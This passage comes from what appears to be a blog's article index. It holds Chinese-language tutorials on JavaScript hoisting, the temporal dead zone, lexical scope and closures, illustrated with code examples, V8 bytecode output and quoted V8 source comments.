的值，在執行的時候應該也就是這行出錯，因為在 global 裡面找不到 b。 看完了基本的之後，我們來看看 let 會編譯成什麼樣子： 12345function funcA() &#123; console.log(a) let a = 10&#125;funcA() 編譯後的結果： 1234567891011121314LdaTheHole // 把 hole 載入到 acc 去Star r0 // r0 = holeStackCheck LdaGlobal [0], [2] Star r2 // r2 = consoleLdaNamedProperty r2, [1], [4]Star r1 // r1 = console.logLdar r0 // 載入 r0ThrowReferenceErrorIfHole [2] // 拋出錯誤CallProperty1 r1, r2, r0, [0] // console.log.call(console, r0)LdaSmi [10]Star r0LdaUndefined Return 你會看到多了一個神秘的東西叫做 hole，這個其實就是我們所說的 TDZ，所以才會有 ThrowReferenceErrorIfHole 那一行，就代表說在 TDZ 結束之前我們如果試圖去存取這個 hole 的值都會拋出錯誤。 至此，也解釋了 TDZ 實際上在編譯階段是如何運作的，就是透過 hole 這個特別的東西。 總結 最近開始補齊自己對 JavaScript 的一些基礎知識，不補還好，一補下去發現自己懂的東西比自己想像中還少，我要先感謝兩篇文章：解读ECMAScript[1]——执行环境、作用域及闭包、JS 作用域，這兩篇是我的啟蒙導師，如果沒看到這兩篇，大概也不會有這篇文章的出現。 JavaScript 常考的幾個點大家都耳熟能詳：this、prototype、clousre 跟 hoisting，而這幾個看似不相關的東西，其實只要你能理解 JavaScript 背後的運作模型，都能夠多少串得起來，成為一個完整的理論。 我在文中也有提到，上面講述執行環境的那段過程，其實補充得更完整以後就可以拿來解釋 clousre，就會發現很多東西其實都能融會貫通。日後有機會的話我會把個變成一系列，一一擊破 JavaScript 裡面那些你以為很難但其實沒有的概念。 寫這篇以前我大概醞釀了一個月，不斷找資料以後消化並且轉化為自己的理解，也很感謝上面那篇 JS 作用域的作者以及 YDKJS 的作者耐心解惑。 最後，也希望這篇文章對你們有幫助，有任何錯誤都可以跟我反映，感謝。 參考資料： MDN: Hoisting ECMA-262-3 in detail. Chapter 2. Variable object. JS 作用域 JavaScript Optimization Patterns (Part 2) danbev/learning-v8 Why is there a “temporal dead zone” in ES6? exploringjs: Variables and scoping # ES6 中的 TDZ（temporal dead zone）及函数作用域 由阮一峰老师的一条微博引发的 TDZ 思考 理解ES6中的暂时死区(TDZ) TEMPORAL DEAD ZONE (TDZ) DEMYSTIFIED MDN: let Grokking V8 closures for fun (and profit?) 解读ECMAScript[1]——执行环境、作用域及闭包","link":"/2018/11/10/javascript-hoisting-and-tdz/"},{"title":"所有的函式都是閉包：談 JS 中的作用域與 Closure ","text":"前言 請先原諒我用了一個比較聳動的標題，因為實在是想不到還有什麼標題好下，最後選擇了一個可能比較有爭議的標題，但能利用這樣的標題激起討論也是滿有趣的，何況我說這話也是有根據的。 在觀看此篇文章之前請先看過上一篇：我知道你懂 hoisting，可是你了解到多深？，因為文章內容有部分相關，所以必須先有 Execution Context 以及 Variable Object 的觀念以後，才能夠吸收這篇文章的東西。 如果你只對文章標題的那句：「所有的函式都是閉包」有興趣，那可以直接往下拉，因為要講閉包就必須先從作用域開始講起，所以這篇文章按照慣例不會太短，前面也會有一定程度的鋪陳。 好，讓我們從作用域開始吧。 作用域（Scope） 什麼是作用域（或也有人翻做：範疇）？ 我自己最喜歡的解釋是：「作用域就是一個變數的生存範圍，一旦出了這個範圍，就無法存取到這個變數」。 來看一個簡單的例子： 1234function test()&#123; var a = 10&#125;console.log(a) // Uncaught ReferenceError: a is not defined 在 ES6 以前，唯一產生作用域的方法就是 function，每一個 function 都有自己的作用域，在作用域外面你就存取不到這個 function 內部所定義的變數。然而 ES6 的時候引入了 let 跟 const，多了 block 的作用域，但那不是本文的重點所在，所以我就先這樣帶過了。 除了這種 function 的作用域以外，還有一種叫做作用域是 global 的，其實就是我們常在說的「全域」，或者是「全域變數」，任何地方都能夠存取到，如下範例： 12345var I_am_global = 123function test() &#123; console.log(I_am_global) // 123&#125;test() 從上面的範例中你可以發現一件有趣的事情，那就是你在 function 裡面可以存取外面的變數，可是你從外面卻進不去 function 裡面，這邊我要引用之前看到的一個很有趣的解釋方法，這篇文章把作用域比喻成明星，把函式比喻成地區。 全域變數就是國際巨星，例如說湯姆克魯斯，無論到哪裡大家都認識這個人，因為實在是太紅了。而 function 裡面的變數就像是你那個很會唱歌的鄰居，整個社區都知道它的存在，但一但出了這個社區（超過了這個 function），就沒人認識他是誰。 所以 function 一層層的結構就像是地區那樣，最外層是地球、再來五大洲、亞洲、臺灣、台北市、大安區、大安森林公園，在大安森林公園運動的人知道那邊常在慢跑的朋友，也知道台北市內的名人，可是居住在台北市的人卻不一定知道大安區的區長是誰，因為那超出了它的範圍。 把上面的說法轉成程式碼就會變成這樣： 12345678910111213function taiwan() &#123; var taiwan_star = 'taiwan_star' function taipei() &#123; function daan() &#123; var daan_star = 'daan_star' console.log(taiwan_star) // taiwan_star &#125; daan() console.log(daan_star) // Uncaught ReferenceError: daan_star is not defined &#125; taipei()&#125;taiwan() 所以你現在對作用域這個詞應該比較能夠理解了，就是一個變數的生存範圍，一但超過那個範圍就存取不到，而這個範圍就是 function 本身及其內部，所以你在 function 裡面宣告了一個變數，function 外是沒辦法存取的。 外面存取不到裡面的，但「內層」可以存取到「外層」的東西： 12345678function test() &#123; var a = 100 function inner() &#123; console.log(a) // 100 &#125; inner()&#125;test() 對於inner這個 function 來說，a並不是它自己的變數，而這種不在自己作用域中，也不是被當成參數傳進來的變數，就可以稱作 free variable，可以翻做自由變數（聽起來滿酷的）。 對 inner 來說，a 就是一個自由變數。 那 a 的值會是什麼？ 因為在 inner 這個作用域裡面找不到 a，就會去上一層 test 的作用域裡面尋找，如果還是找不到，就會再往上一層直到找到為止，所以你可以發現這樣會構成一個「作用域鏈」，inner function scope -&gt; test function scope -&gt; global scope，不斷在這條鏈往上找，如果最後還是找不到就拋出錯誤。 講到這邊基本的概念應該都有了，再來我要出一個問題把你的認知重新打亂並混淆你： 1234567891011var a = 100function echo() &#123; console.log(a) // 100 or 200?&#125; function test() &#123; var a = 200 echo()&#125; test() 請問最後 log 出來的 a 應該會是 100 還是 200？ 我知道！是 100，因為全域變數裡面的 a 是 100…等等，可是我在 test 裡面的時候又宣告了一個叫 a 的變數並設為 200，echo 裡面的這個 a 好像也可能是 200…好混亂。 答案是 100，你只要掌握我們之前說的那些原則就行了，echo 裡面的那個 a 就是 global 的那個 a，跟 test 裡面的 a 一點關係都沒有。 但你會被混淆也是非常合理的事情，因為在某些程式語言裡面，a 的確會是 200 喔！a 最後出來的值（或換句話說，如何決定自由變數的值）跟程式語言如何決定「作用域」這件事情有關係。 其實我們一開始介紹的這種方法，叫做靜態作用域（static scope），為什麼叫做靜態？就代表作用域跟這個 function 在哪裡被「呼叫」一點關係都沒有，你用肉眼看程式碼的結構就可以看出來它的作用域是什麼，而且是不會變的。 舉例來說，上面那個範例印出來的 a 就會是 global 的 a，儘管我在 test 裡面宣告了另外一個 a 並且呼叫 echo 這個 function，但這跟作用域一點關係都沒有，靜態作用域是在 function 被「宣告」的時候就決定了，而不是 function 被「執行」的時候。 相對地，有靜態作用域就有動態作用域（dynamic scope），如果這個程式語言是採用動態作用域，那最後 log 出來的值就會是 200 而不是 100；換句話說，echo 這個 function 裡面的 a 的值是在程式執行時期才被動態決定的，你只看程式碼的結構沒辦法決定 a 到底是什麼值。 而 JavaScript 的作用域是採用前者，靜態作用域，所以你分析程式碼的結構就可以知道作用域的長相。這邊順帶一提的是 JavaScript 裡面最難解的問題之一：this，其實原理跟動態作用域有異曲同工之妙，那就是 this 的值也是程式執行時才被動態決定的，這也是為什麼一大堆人會搞不清楚它的值是什麼，因為會變來變去的。 靜態作用域其實更學術的名詞叫做 lexical scope，我有看過有人翻成語彙範疇，有人則是翻成詞法作用域。 要理解什麼是 lexical，你必須先知道一點 compiler 的運作原理。在編譯的時候有幾個步驟是用程式去 parse 你的程式碼並且解析，而其中一個步驟就叫做 Lexical Analysis（詞法分析或語彙分析），其實就是去正確分析出程式碼裡面的每一個詞。 我舉一個例子好了，例如說 a = 13 + 2這一個句子，經過詞法分析之後可能就會變成：a、=、13、+、2，這樣子的分組，就先理解到這邊就好，想知道更多編譯器的細節請自行參考相關書籍或文章，或等我有一天把這個基礎補足之後再來用白話文跟大家分享。 所以會叫做 lexical scope 的原因就是在編譯的時候其實就能決定作用域是什麼，才有了這樣子的一個名稱。 跟作用域相關的內容就到這裡了，幫大家複習幾個關鍵字： 作用域鏈 scope chain 自由變數 free variable 靜態作用域 static scope（lexical scope） 動態作用域 dynamic scope 閉包（Closure） 再來終於要進入到閉包的相關內容了，在這之前我先介紹一下大家印象中的閉包大概是什麼樣子，然後又具備了什麼樣的特性。 請看以下範例程式碼： 123456789function test() &#123; var a = 10 function inner() &#123; console.log(a) // 10 &#125; inner()&#125; test() 沒什麼特別的，就只是執行一個內部的 function 而已。但如果我們現在不要直接執行 inner，而是把這個 function 回傳呢？ 12345678910function test() &#123; var a = 10 function inner() &#123; console.log(a) // 還是 10 &#125; return inner&#125; var inner = test()inner() 神奇的事情發生了，那就是程式碼依舊輸出了 10。 神奇在哪裡？神奇在一個 function 執行完成以後本來會把所有相關的資源釋放掉，可是我 test 已經執行結束了，照理來說變數 a 的記憶體空間也被釋放，但我呼叫 inner 的時候居然還存取得到 a！ 換句話說，a 這個變數被「關在」inner 這個 function 裡面了，所以只要 inner 還存在的一天，a 就永無安寧，只能一直被關在裡面。 而事情的主因就是我在 function 裡面回傳了一個 function，才能造成這種明明執行完畢卻還有東西被關住的現象，而這種情形就是一般人所熟知的閉包，Closure。 那閉包的好處有什麼？優點之一就是能把變數隱藏在裡面讓外部存取不到，舉例來說我有個紀錄餘額的變數跟一個扣款的 function，但我有設置了一個上限，那就是最高只能扣 10 塊： 1234567var my_balance = 999function deduct(n) &#123; my_balance -= (n &gt; 10 ? 10 : n) // 超過 10 塊只扣 10 塊&#125; deduct(13) // 只被扣 10 塊my_balance -= 999 // 還是被扣了 999 塊 儘管我們寫了 deduct 這個 function 來操作，但變數還是暴露在外部，任何人都可以直接來改這個變數。這時如果我們利用閉包來改寫，世界就不一樣了： 123456789101112function getWallet() &#123; var my_balance = 999 return &#123; deduct: function(n) &#123; my_balance -= (n &gt; 10 ? 10 : n) // 超過 10 塊只扣 10 塊 &#125; &#125;&#125; var wallet = getWallet()wallet.deduct(13) // 只被扣 10 塊my_balance -= 999 // Uncaught ReferenceError: my_balance is not defined 因為我把餘額這個變數給藏在 function 裡面，所以外部是存取不到的，你想要修改只能夠利用我暴露出去的 deduct 這個函式，這樣子就達到了隱藏資訊的目的，確保這個變數不會隨意地被改到。 但比起這個閉包的用法，我相信有很多人應該都是從底下這個慘痛的經驗才知道有閉包這個東西： 123456var btn = document.querySelectorAll('button')for(var i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', function() &#123; alert(i) &#125;)&#125; 假設頁面上有五個按鈕，我想要第一個按下去時彈出 0，第二個按下去時彈出 1，以此類推，於是寫了上面的程式碼，看起來十分合理。 誰知道我一點下去按鈕，靠腰勒為什麼每一個按鈕都彈出 5，都彈出一樣的數字就夠詭異了，5 到底是從哪來的啊？ 包括我自己也是有類似的經驗才意識到自己對作用域以及閉包不太熟悉，現在有了經驗之後再回頭來看上面這段程式碼就能夠完全理解了。 首先，上面的迴圈你以為是這樣子： 123456789btn[0].addEventListener('click', function() &#123; alert(0)&#125;) btn[1].addEventListener('click', function() &#123; alert(1)&#125;) ... 但其實是這樣子： 123456789btn[0].addEventListener('click', function() &#123; alert(i)&#125;) btn[1].addEventListener('click', function() &#123; alert(i)&#125;) ... 仔細想想你會發現下面比較合理，我本來就是幫它加一個 function 是按下去的時候會跳出 i 而已，我又沒有直接執行這個 function。 所以當使用者按按鈕的時候，畫面就會跳出 i，那這個 i 的值會是什麼？因為你按按鈕的時候迴圈已經跑完了，所以 i 早已變成 5（迴圈的最後一圈，i 加一變成 5，判斷不符合 i&lt;=4 這個條件所以跳出迴圈），畫面也就跳出數字 5 了。 我加上的這幾個 function，本身都沒有 i 這個變數，所以往作用域的外層去尋找，就找到上面迴圈的那個變數 i 了，因此這幾個 function 所指涉到的 i 是同一個 i。 那應該怎麼解決這個問題呢？加上 function！ 12345678function getAlert(num) &#123; return function() &#123; alert(num) &#125;&#125;for(var i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', getAlert(i))&#125; 這邊要注意的是 getAlert(i) 會「回傳」一個跳出 i 的 function，因此我額外產生了五個新的 function，每一個 function 裡面都有自己該跳出的值。 或是你要耍帥的話就這樣寫： 1234567for(var i=0; i&lt;=4; i++) &#123; (function(num) &#123; btn[i].addEventListener('click', function() &#123; alert(num) &#125;) &#125;)(i)&#125; 利用 IIFE（Immediately Invoked Function Expression）把一個 function 包起來並傳入 i 立即執行，所以迴圈每跑一圈其實就會立刻呼叫一個新的 function，因此就產生了新的作用域。 以上如果你都覺得太麻煩不想用，恭喜，在 ES6 裡面有了 block scope 以後，你只要簡單地把迴圈裡面用的 var 改成 let 就行了： 12345for(let i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', function() &#123; alert(i) &#125;)&#125; 因為 let 的特性，所以其實迴圈每跑一圈都會產生一個新的作用域，因此 alert 出來的值就會是你想要的那個值。如果你還是覺得有點疑惑，你可以把迴圈看成這樣： 12345678910111213&#123; // 塊級作用域 let i=0 btn[i].addEventListener('click', function() &#123; alert(i) &#125;)&#125;&#123; // 塊級作用域 let i=1 btn[i].addEventListener('click', function() &#123; alert(i) &#125;)&#125;... 說到這邊我們對閉包有了初步的理解，但對於「什麼是閉包」這個問題似乎還沒有一個明確的定義，「閉包就是可以把值關在裡面的 function」聽起來怪怪的，如果你去找維基百科，他會跟你說： 在電腦科學中，閉包（英語：Closure），又稱詞法閉包（Lexical Closure）或函式閉包（function closures），是參照了自由變數的函式。這個被參照的自由變數將和這個函式一同存在，即使已經離開了創造它的環境也不例外。所以，有另一種說法認為閉包是由函式和與其相關的參照環境組合而成的實體。 如果去找英文的維基百科，可以看到它寫著： Operationally, a closure is a record storing a function together with an environment 好，看起來還是有點霧煞煞，但總之對於閉包的定義先在此打住，大家心中有個模糊的概念就好，我們晚點再回來處理。 在這個段落我們知道了閉包可以實際應用在哪裡，也理解了閉包可以存取到應該被釋放的值（但卻因為閉包的存在無法被釋放），再來我們來看看 ECMAScript 是如何講述作用域的。 ECMAScript 中的作用域 在開始之前，如果你忘記我們之前講的運作模型，請回去我知道你懂 hoisting，可是你了解到多深？複習一下，因為我們等等會用到。 在這邊我一樣用篇幅較少的 ES3 來當範例，要注意的是 ES6 以後很多名詞變得不一樣了，但原理大致上是相通的。 上次我們在10.1.3 Variable Instantiation的章節看到了 hoisting 相關的東西，這次我們要看的則是下一個段落而已，也就是10.1.4 Scope Chain and Identifier Resolution。 Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. When control enters an execution context, a scope chain is created and populated with an initial set of objects, depending on the type of code. 每個 EC 都有自己的 scope chain，當進入 EC 的時候 scope chain 會被建立。 接著我們來看10.2 Entering An Execution Context底下的10.2.3 Function Code： The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object. 這一段描述了 scope chain 的內容到底是什麼，它講說當進入 EC 的時候，scope chain 會被初始化為 activation object 並加上 function 的[[Scope]]這個屬性。 以上段落其實要講的事情只有一個，就是在進入 EC 的時候會做下面這件事： 1scope chain = activation object + [[Scope]] 接著要處理的是兩個問題：什麼是 activation object（以下簡稱 AO），什麼又是[[Scope]]？ 在10.1.6 Activation Object可以找到 AO 的解釋： When control enters an execution context for function code, an object called the activation object is created and associated with the execution context. The activation object is initialised with a property with name arguments and attributes { DontDelete } The activation object is then used as the variable object for the purposes of variable instantiation. 這邊提到When control enters an execution context for function code，意思就是只有在進入「函式」的時候會產生這個 AO，而之後 AO 便被當作 VO 拿去使用。 所以什麼是 AO？你可以把它直接當作 VO 的另外一種特別的型態，只在 function 的 EC 中出現，所以在 global 的時候我們有 VO，在 function 內的時候我們有 AO，但是做的事情都是一樣的，那就是會把一些相關的資訊放在裡面。 差別在哪裡？差別在於 AO 裡面會有一個arguments，畢竟是給 function 用的嘛，一定要存這個，其餘地方都是差不多的。如果你偷懶把 VO 跟 AO 這兩個詞混在一起使用，我覺得也是可以接受的，因為差別真的太細微了。 解決了 AO 的問題之後，那什麼是[[Scope]]？在13.2 Creating Function Objects的部分可以看到更詳細的解釋： Given an optional parameter list specified by FormalParameterList, a body specified by FunctionBody, and a scope chain specified by Scope, a Function object is constructed as follows （中間省略） 7.Set the [[Scope]] property of F to a new scope chain (10.1.4) that contains the same objects as Scope. 就是說你在建立 function 的時候會給一個 Scope，而這一個 Scope 會被設定到[[Scope]]去。 那在建立 function 時給的 Scope 是什麼？還能有什麼，當然就是當前 EC 的 Scope。 這樣一段段看完之後其實我們可以整理出這樣的一個流程： 當 function A 建立時，設置A.[[Scope]] = scope chain of current EC 當進入一個 function A 時，產生一個新的 EC，並設置EC.scope_chain = AO + A.[[Scope]] 想要完全搞清楚，就讓我們實際再來跑一遍這整個流程就行了，我們用下面這個非常簡單的程式碼作為範例： 12345678910var v1 = 10function test() &#123; var vTest = 20 function inner() &#123; console.log(v1, vTest) //10 20 &#125; return inner&#125;var inner = test()inner() 第一步：進入 Global EC 現在進入 Global EC 並且初始化 VO 以及 scope chain，前面有講過scope chain = activation object + [[Scope]]，但因為這不是一個 function 所以沒有[[Scope]]，而沒有 AO 就直接拿 VO 來用。總之，最後 Global EC 會是這樣： 12345678globalEC = &#123; VO: &#123; v1: undefined, inner: undefined, test: function &#125;, scopeChain: globalEC.VO&#125; VO 的部分就按照之前講過的初始化，現在唯一多的步驟是多出了 scopeChain 這個屬性，而按照定義，scope chain 就是 globalEC 自己的 VO/AO。 這邊別忘了還有最後一步，那就是要設置 function 的[[Scope]]，所以 test 這個 function 的[[Scope]]就會是globalEC.scopeChain也就是globalEC.VO。 第二步：執行程式碼 再來第二步執行程式碼，跑了var v1 = 10之後碰到var inner = test()，這邊要準備進入到 test 的 EC 了，在進入前我們現在的資訊長這樣： 12345678910globalEC = &#123; VO: &#123; v1: 10, inner: undefined, test: function &#125;, scopeChain: globalEC.VO&#125; test.[[Scope]] = globalEC.scopeChain 第三步：進入 test EC 按照慣例，進入的時候先把 test EC 跟 AO 建立起來，然後記得scope chain = activation object + [[Scope]] 12345678910111213141516171819202122testEC = &#123; AO: &#123; arguments, vTest: undefined, inner: function &#125;, scopeChain: [testEC.AO, test.[[Scope]]] = [testEC.AO, globalEC.scopeChain] = [testEC.AO, globalEC.VO]&#125; globalEC = &#123; VO: &#123; v1: 10, inner: undefined, test: function &#125;, scopeChain: globalEC.VO&#125; test.[[Scope]] = globalEC.scopeChain 可以看到的是 testEC 的 scope chain 就是自己的 AO 加上之前設置過的[[Scope]]，然後說穿了，其實 scope chain 就是上層的 EC 的 VO 嘛！只是我們用了比較複雜的程序去設置這件事情，但本質上其實就是 VO/AO 的組合。 最後別忘記設置 inner 的 scope，inner.[[Scope]] = testEC.scopeChain。 第四步：執行 test 中的程式碼 其實也就只跑了var vTest = 20跟return inner，執行完以後變成這樣： 12345678910111213141516171819testEC = &#123; AO: &#123; arguments, vTest: 20, inner: function &#125;, scopeChain: [testEC.AO, globalEC.VO]&#125; globalEC = &#123; VO: &#123; v1: 10, inner: function, test: function &#125;, scopeChain: globalEC.VO&#125; inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO] 接著把 inner 回傳回去，而test這個 function 就結束了，照理來說資源應該要被釋放才對。 可是！你有沒有發現現在inner.[[Scope]]記著testEC.AO？因為有人還需要它，所以它沒辦法就這樣被釋放，僅管 test 結束了，testEC.AO 還是存在於記憶體裡面。 第五步：進入 inner EC 這邊就不贅述了，就按照同樣的原則去做初始化： 1234567891011121314151617181920212223242526272829innerEC = &#123; AO: &#123; arguments &#125;, scopeChain: [innerEC.AO, inner.[[Scope]]]= [innerEC.AO, testEC.scopeChain]= [innerEC.AO, testEC.AO, globalEC.VO]&#125; testEC = &#123; AO: &#123; arguments, vTest: 20, inner: function &#125;, scopeChain: [testEC.AO, globalEC.VO]&#125; globalEC = &#123; VO: &#123; v1: 10, inner: function, test: function &#125;, scopeChain: globalEC.VO&#125; inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO] 有沒有發現就跟我剛才講的一樣，其實 scope chain 說穿了就是 VO/AO 的組合而已。 第六步：執行 inner 從 scope chain 裡面尋找 v1 跟 vTest 這兩個變數，在自己的 AO 裡面找不到所以往上找，找到 testEC.AO 並尋獲 vTest，但 v1 還是沒找到所以又往上一層去看 globalEC.VO，最後找到 v1，成功獲得這兩個變數的值並印出。 結束。 上面的流程講得較為詳細，可以自己再開個小視窗在旁邊搭配著程式碼一起看，一步步來看相信會比較容易理解。其實在上次討論 hoisting 的時候就已經講過這個模型了，而今天只是補充上次沒講到的部分，那就是 scope chain，加上去之後這個模型就完整許多，不但能解釋 hoisting，也能解釋為什麼 function 執行結束以後還可以存取的到那些變數。 因為那些變數被留在 innerEC 的 scope chain 裡面，所以不會也不能被 GC 回收掉，才會發生這種現象。 而理解了 scope chain 其實只是 VO/AO 的組合以後，也能很輕易地就知道我們開頭所說的「在 scope chain 往上找」是什麼意思，就是往上一層去看有沒有這個變數嘛，因為有的話一定會存在 VO/AO 裡面。 最後，上面這個模型還有一件事情要注意，那就是無論我有沒有把內部的 function 給回傳（以上面這個例子就是 inner），都不影響這個機制的運行。 意思是說儘管我的程式碼長這樣： 123456789var v1 = 10function test() &#123; var vTest = 20 function inner() &#123; console.log(v1, vTest) //10 20 &#125; inner() // 不回傳直接執行&#125;test() 他最後出來的模型跟剛剛的程式碼是一模一樣的，inner 都有一樣的 scope chain，並且一樣存著 test 跟 global EC 的 VO/AO。 你有注意到我們正一步步邁向我們的標題嗎？ 所有的函式都是閉包 我們再回來看 wiki 上面對閉包的定義： 在電腦科學中，閉包（英語：Closure），又稱詞法閉包（Lexical Closure）或函式閉包（function closures），是參照了自由變數的函式。這個被參照的自由變數將和這個函式一同存在，即使已經離開了創造它的環境也不例外。所以，有另一種說法認為閉包是由函式和與其相關的參照環境組合而成的實體。 如果說你認為閉包一定要：「離開創造它的環境」，那顯然「所有的函式都是閉包」這句話就不成立；但如果你認同閉包的定義是：「由函式和與其相關的參照環境組合而成的實體」，那就代表在 JavaScript 裡面，所有的函式都是閉包。 為什麼？因為這就是 JavaScript 的運行機制，你每個宣告的 function 都會儲存著[[Scope]]，而這個資訊裡面就是參照的環境。 而這個說法也不是我自創的，在解釋 ECMAScript 最經典的系列文章中的其中一篇：ECMA-262-3 in detail. Chapter 6. Closures.，裡面是這樣說的： Let’s make a note again, that all functions, independently from their type: anonymous, named, function expression or function declaration, because of the scope chain mechanism, are closures. from the theoretical viewpoint: all functions, since all they save at creation variables of a parent context. Even a simple global function, referencing a global variable refers a free variable and therefore, the general scope chain mechanism is used; 所以從理論上來說，JavaScript 裡面的所有 function 都是閉包。 from the practical viewpoint: those functions are interesting which: continue to exist after their parent context is finished, e.g. inner functions returned from a parent function; use free variables. 但如果你只從「實作」上的觀點來關心閉包的話，我們會說閉包必須要用到自由變數，也必須在離開了建立的 context 以後還能夠存在，這樣才是我們真正所關心的那個閉包。 所以閉包到底是什麼，端看你從哪個角度去看他，但無庸置疑的，從理論上的角度來看 JavaScript 裡所有的 function 都是閉包，如果你還是不信的話，那最後我帶你來看看 V8 是怎麼想的。 再探 V8 我們一樣寫一段簡單的程式碼，看看最後會 compile 出什麼東西： 12345var a = 23function yoyoyo()&#123; &#125;yoyoyo() 這邊放一個 23 是因為方便我們在 byte code 中定位到這段程式，只有 function 會有名稱可以識別，這種寫在 global 裡面的東西比較難找。 產生出的結果是這樣： 123456789101112131415161718[generating bytecode for function: ]Parameter count 6Frame size 16 0x3e0ed5f6a9da @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x3e0ed5f6a9de @ 4 : 1e fa Star r1 10 E&gt; 0x3e0ed5f6a9e0 @ 6 : 91 StackCheck 70 S&gt; 0x3e0ed5f6a9e1 @ 7 : 03 17 LdaSmi [23] 0x3e0ed5f6a9e3 @ 9 : 1e fb Star r0 95 S&gt; 0x3e0ed5f6a9e5 @ 11 : 4f fa 01 CallUndefinedReceiver0 r1, [1] 0x3e0ed5f6a9e8 @ 14 : 04 LdaUndefined 107 S&gt; 0x3e0ed5f6a9e9 @ 15 : 95 Return [generating bytecode for function: yoyoyo]Parameter count 1Frame size 0 88 E&gt; 0x3e0ed5f6b022 @ 0 : 91 StackCheck 0x3e0ed5f6b023 @ 1 : 04 LdaUndefined 93 S&gt; 0x3e0ed5f6b024 @ 2 : 95 Return 你只要看關鍵字就好了，你有沒有看到建立 function 的那邊是什麼？是CreateClosure，我們只是很簡單的創建一個 function 並且呼叫他而已，V8 依然是用CreateClosure這個指令。 那如果今天是在 function 裡面建立一個新的 function 呢？ 1234function yoyoyo()&#123; function inner()&#123;&#125;&#125;yoyoyo() 結果： 12345678[generating bytecode for function: yoyoyo]Parameter count 1Frame size 8 0x2c9f0836b0fa @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x2c9f0836b0fe @ 4 : 1e fb Star r0 77 E&gt; 0x2c9f0836b100 @ 6 : 91 StackCheck 0x2c9f0836b101 @ 7 : 04 LdaUndefined 106 S&gt; 0x2c9f0836b102 @ 8 : 95 Return 一樣還是呼叫了CreateClosure。最後讓我們來試試看我們所熟知的那種，也就是要回傳建立的 function： 12345function yoyoyo()&#123; function inner()&#123;&#125; return inner&#125;yoyoyo() 結果： 1234567[generating bytecode for function: yoyoyo]Parameter count 1Frame size 8 0x3f4bde3eb0fa @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x3f4bde3eb0fe @ 4 : 1e fb Star r0 77 E&gt; 0x3f4bde3eb100 @ 6 : 91 StackCheck 116 S&gt; 0x3f4bde3eb101 @ 7 : 95 Return 差別在哪裡？只差在前者在回傳前多了一個LdaUndefined 載入 undefined，後者沒加所以把建立出來的 function 傳回去。可是在建立 function 的指令上面，是一模一樣的，都叫做CreateClosure。 只看 compile 出來的程式碼或許有失公允，如果能看到 V8 內部怎麼講就再好不過了。 以前曾經試圖想找但是 V8 太大了，這次我碰巧在找資料的時候看見這篇文章：Analyze implementation of closures in V8，雖然是九年前的文章，但裡面有稍微提到一些關鍵字，我循著關鍵字去找，找到了幾個很有趣的地方。 第一個是 src/interpreter/interpreter-generator.cc 這隻檔案，裡面記錄著所有 byte code 的指令，對CreateClosure它是這麼描述的： 1234// CreateClosure &lt;index&gt; &lt;slot&gt; &lt;tenured&gt;//// Creates a new closure for SharedFunctionInfo at position |index| in the// constant pool and with the PretenureFlag &lt;tenured&gt;. 這檔案對以後看 byte code 很有幫助，所以要特地 po 在這邊記起來。 第二個是 src/contexts.h，這邊紀錄的資訊十分豐富，你可以看到這一段註解： 12345678910111213// JSFunctions are pairs (context, function code), sometimes also called// closures. A Context object is used to represent function contexts and// dynamically pushed &apos;with&apos; contexts (or &apos;scopes&apos; in ECMA-262 speak).//// At runtime, the contexts build a stack in parallel to the execution// stack, with the top-most context being the current context. All contexts// have the following slots://// [ scope_info ] This is the scope info describing the current context. It// contains the names of statically allocated context slots,// and stack-allocated locals. The names are needed for// dynamic lookups in the presence of &apos;with&apos; or &apos;eval&apos;, and// for the debugger. 除了我們最想知道的 Closure，它也提到了 context 跟 scope info，都是我們上面所討論的東西，概念類似只是名詞有點不太一樣而已。 但最重要的是這句： JSFunctions are pairs (context, function code), sometimes also called closures. 每一個 JS 的 function 都記錄著 context 的資訊，再次印證了我們先前所講的機制。 第三個也是最後一個，我意外地發現了 V8 裡面處理 scope 的地方，在 src/ast/scopes.cc，點連結之後連到的地方LookupRecursive就是在講述尋找變數的過程，先在 scope 裡面找，沒有的話再往上面找，還是找不到的話就在 global 宣告一個。 熟知這段過程這麼久，第一次看見 V8 的實現長怎樣，實在是很有趣。雖然 C++ 看不太懂，但幸好文章裡面有大量的註解，所以看著註解就可以理解五六成的程式碼。 結論 有一個小地方要先說明，在我這篇以及上一篇裡面，我都刻意不提及eval跟with這兩個東西，因為這兩個東西會讓作用域變得複雜許多所以我才故意不帶到，在我看 V8 程式碼的時候也看到大量程式碼是在處理這兩個的操作，如果你對這兩個操作有興趣，可以自行去找相關的文章來看。 在上一次徹底理解 hoisting 的過程中我們有了最重要的底層機制的運行概念，也稍微看到了 V8 的 byte code，在這一次則是把上次的模型補充得更完整，只要按照那個模型去解釋程式的運行，什麼 hoisting 什麼 closure 的都能夠輕鬆理解。 這次也更深入了 V8，直接看到處理 scope 以及 context 相關的程式碼，但 V8 畢竟還是一個很大的專案，光幾個檔案我就看不完了，根本不能談上理解，因此只是以一種好玩的角度想去看一下而已。 這篇的目標跟上一篇一樣，對於本來就對這個主題不熟的人，希望能夠讓你們理解這個主題；對於已經熟悉的人也希望能帶來一些新的想法，畢竟我左看右看上看下看都沒看到什麼人直接跑去 V8 找相關的程式碼段落出來。 參考資料： 从static/dynamic scope来谈JS的作用域 MDN 深入淺出瞭解 JavaScript 閉包（closure） 你不可不知的 JavaScript 二三事#Day5：湯姆克魯斯與唐家霸王槍——變數的作用域(Scope) (1) 關於 JS 作用域裡面的解釋 ECMA-262-3 in detail. Chapter 6. Closures. Grokking V8 closures for fun (and profit?) Understanding JavaScript Closures https://javascript.info/closure Analyze implementation of closures in V8","link":"/2018/12/08/javascript-closure/"},{"title":"紮實的網頁前端學習路線與資源推薦","text":"（原文寫在 Medium，順便在這邊備份一下） 